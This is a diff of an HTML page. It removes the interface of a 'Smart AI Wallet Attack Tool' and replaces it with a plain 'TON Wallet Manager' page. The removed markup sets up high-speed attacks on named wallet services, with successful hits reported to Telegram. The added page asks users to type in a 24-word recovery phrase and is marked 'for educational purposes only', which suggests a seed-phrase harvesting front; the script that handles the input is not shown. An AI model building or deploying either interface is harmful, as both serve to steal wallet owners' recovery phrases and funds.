@@ -3,233 +3,48 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Smart AI Wallet Attack Tool</title>
+    <title>TON Wallet Manager</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <div class="container">
         <header>
-            <div class="header-content">
-                <h1>⚡ Smart AI Attack System</h1>
-                <div class="subtitle">Advanced Wallet Security Testing Tool</div>
-            </div>
-            <div class="attack-status">
-                <div class="status-indicator">
-                    <span class="pulse"></span>
-                    SYSTEM READY
-                </div>
-            </div>
+            <h1>TON Wallet</h1>
+            <p>Secure cryptocurrency wallet management</p>
         </header>
 
-        <div class="main-layout">
-            <!-- Left Panel - Attack Configuration -->
-            <div class="config-panel">
-                <div class="target-section">
-                    <div class="section-title">
-                        <span class="icon">🎯</span>
-                        Target Configuration
-                    </div>
-                    <div class="target-input-group">
-                        <label>Attack Website URL</label>
-                        <input type="text" id="attackUrl" placeholder="https://wallet.target-site.com" class="target-input">
-                        <div class="preset-targets">
-                            <button class="preset-btn" data-url="https://wallet.tonkeeper.com">Tonkeeper</button>
-                            <button class="preset-btn" data-url="https://wallet.trustwallet.com">Trust Wallet</button>
-                            <button class="preset-btn" data-url="https://wallet.metamask.io">MetaMask</button>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="attack-config">
-                    <div class="section-title">
-                        <span class="icon">⚙️</span>
-                        Attack Parameters
-                    </div>
-                    <div class="config-grid">
-                        <div class="config-item">
-                            <label>Attack Speed</label>
-                            <select id="attackSpeed">
-                                <option value="1000">Slow (1,000/min)</option>
-                                <option value="3000" selected>Medium (3,000/min)</option>
-                                <option value="5000">Fast (5,000/min)</option>
-                                <option value="10000">Turbo (10,000/min)</option>
-                            </select>
-                        </div>
-                        <div class="config-item">
-                            <label>AI Intelligence</label>
-                            <select id="aiIntelligence">
-                                <option value="basic">Basic Pattern</option>
-                                <option value="smart" selected>Smart AI</option>
-                                <option value="advanced">Advanced AI</option>
-                                <option value="quantum">Quantum AI</option>
-                            </select>
-                        </div>
-                        <div class="config-item">
-                            <label>Retry Strategy</label>
-                            <select id="retryStrategy">
-                                <option value="normal">Normal Retry</option>
-                                <option value="aggressive" selected>Aggressive</option>
-                                <option value="smart">Smart Retry</option>
-                            </select>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="control-section">
-                    <div class="section-title">
-                        <span class="icon">🚀</span>
-                        Attack Controls
-                    </div>
-                    <div class="control-buttons">
-                        <button class="attack-btn" id="startAttack">
-                            <span class="icon">🎯</span>
-                            START ATTACK
-                        </button>
-                        <button class="stop-btn" id="stopAttack" disabled>
-                            <span class="icon">⏹️</span>
-                            STOP ATTACK
-                        </button>
-                        <button class="smart-btn" id="analyzeBtn">
-                            <span class="icon">🔍</span>
-                            AI ANALYSIS
-                        </button>
-                    </div>
-                </div>
-
-                <div class="quick-stats">
-                    <div class="stat-card">
-                        <div class="stat-value" id="successRate">0%</div>
-                        <div class="stat-label">Success Rate</div>
-                    </div>
-                    <div class="stat-card">
-                        <div class="stat-value" id="completion">0%</div>
-                        <div class="stat-label">Completion</div>
-                    </div>
-                    <div class="stat-card">
-                        <div class="stat-value" id="aiEfficiency">0</div>
-                        <div class="stat-label">AI Efficiency</div>
-                    </div>
-                </div>
+        <div class="wallet-options">
+            <div class="option-card">
+                <h3>➕ New Wallet</h3>
+                <p>Create a new secure wallet</p>
+                <button onclick="createNewWallet()">Create</button>
             </div>
 
-            <!-- Right Panel - Attack Monitor -->
-            <div class="monitor-panel">
-                <div class="attack-stats">
-                    <div class="stat-box">
-                        <div class="stat-number" id="totalAttempts">0</div>
-                        <div class="stat-label">Total Attacks</div>
-                    </div>
-                    <div class="stat-box">
-                        <div class="stat-number" id="successCount">0</div>
-                        <div class="stat-label">Successful</div>
-                    </div>
-                    <div class="stat-box">
-                        <div class="stat-number" id="failedCount">0</div>
-                        <div class="stat-label">Failed</div>
-                    </div>
-                    <div class="stat-box">
-                        <div class="stat-number" id="currentSpeed">0</div>
-                        <div class="stat-label">Attacks/Sec</div>
-                    </div>
-                </div>
-
-                <div class="live-monitor">
-                    <div class="monitor-header">
-                        <h3>📡 Live Attack Monitor</h3>
-                        <div class="monitor-controls">
-                            <button class="clear-btn" id="clearMonitor">
-                                <span class="icon">🗑️</span>
-                                Clear Log
-                            </button>
-                            <div class="active-attacks">
-                                <span class="dot"></span>
-                                Active: <strong id="activeAttacks">0</strong>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="monitor-container">
-                        <div class="attack-log" id="attackLog">
-                            <div class="log-entry system">
-                                <span class="log-time">12:00:00</span>
-                                <span class="log-message">🛡️ Attack System Initialized - Ready for target configuration</span>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="results-panel">
-                    <div class="results-tabs">
-                        <button class="result-tab active" data-tab="success">Successful Attacks</button>
-                        <button class="result-tab" data-tab="patterns">Attack Patterns</button>
-                        <button class="result-tab" data-tab="telegram">Telegram Reports</button>
-                    </div>
-                    
-                    <div class="results-content active" id="success">
-                        <div class="success-list" id="successList">
-                            <div class="no-results">No successful attacks yet</div>
-                        </div>
-                    </div>
-
-                    <div class="results-content" id="patterns">
-                        <div class="pattern-analysis">
-                            <div class="pattern-item">
-                                <div class="pattern-name">Word Frequency Analysis</div>
-                                <div class="pattern-bar">
-                                    <div class="pattern-fill" style="width: 45%"></div>
-                                </div>
-                                <div class="pattern-value">45%</div>
-                            </div>
-                            <div class="pattern-item">
-                                <div class="pattern-name">Sequence Detection</div>
-                                <div class="pattern-bar">
-                                    <div class="pattern-fill" style="width: 67%"></div>
-                                </div>
-                                <div class="pattern-value">67%</div>
-                            </div>
-                            <div class="pattern-item">
-                                <div class="pattern-name">Pattern Recognition</div>
-                                <div class="pattern-bar">
-                                    <div class="pattern-fill" style="width: 82%"></div>
-                                </div>
-                                <div class="pattern-value">82%</div>
-                            </div>
-                        </div>
-                    </div>
-
-                    <div class="results-content" id="telegram">
-                        <div class="telegram-reports" id="telegramReports">
-                            <div class="report-item">
-                                <div class="report-time">12:00:01</div>
-                                <div class="report-message">Telegram system ready - Reports will appear here</div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
+            <div class="option-card">
+                <h3>📥 Import Wallet</h3>
+                <p>Import with recovery phrase</p>
+                <button onclick="showImportSection()">Import</button>
             </div>
         </div>
 
-        <div class="status-bar">
-            <div class="status-item">
-                <span class="status-label">Target:</span>
-                <span class="status-value" id="currentTarget">Not Set</span>
+        <div id="importSection" class="import-section hidden">
+            <h3>Import Wallet with Recovery Phrase</h3>
+            <div class="word-grid">
+                <!-- 24 word inputs will be generated here -->
             </div>
-            <div class="status-item">
-                <span class="status-label">Attack Status:</span>
-                <span class="status-value" id="attackStatus">Ready</span>
-            </div>
-            <div class="status-item">
-                <span class="status-label">Last Success:</span>
-                <span class="status-value" id="lastSuccess">Never</span>
-            </div>
-            <div class="status-item">
-                <span class="status-label">Telegram:</span>
-                <span class="status-value" id="telegramStatus">Ready</span>
-            </div>
+            <button onclick="importWallet()" class="import-btn">Import Wallet</button>
         </div>
+
+        <div id="walletInfo" class="wallet-info hidden">
+            <h3>Wallet Status</h3>
+            <div id="statusMessage"></div>
+        </div>
+
+        <footer>
+            <p>For educational purposes only | Secure your recovery phrase</p>
+        </footer>
     </div>
 
-    <div class="notification" id="notification"></div>
-    
     <script src="script.js"></script>
 </body>
 </html>
